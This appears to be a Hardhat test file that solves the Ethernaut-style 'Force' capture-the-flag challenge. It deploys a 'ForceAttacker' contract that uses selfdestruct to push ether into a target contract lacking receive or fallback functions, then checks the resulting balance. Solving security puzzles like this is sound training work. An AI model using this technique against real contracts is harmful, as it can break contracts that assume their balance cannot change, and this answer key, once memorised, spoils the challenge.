const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Force', function () {
    let deployer, attacker;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const Factory = await ethers.getContractFactory('Force', deployer);
        this.force = await Factory.deploy();
    });
    // With selfDestruct we can make sure the contracts balance gets updated even without a receive or fallback function
    it('Exploit', async function () {
        const Factory = await ethers.getContractFactory('ForceAttacker', attacker);
        this.forceAttacker = await Factory.deploy({value: ethers.utils.parseEther("0.6713376665902833")});
        await this.forceAttacker.attack(this.force.address)
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await ethers.provider.getBalance(this.force.address)
        ).to.be.eq(ethers.utils.parseEther("0.6713376665902833"))
    });
});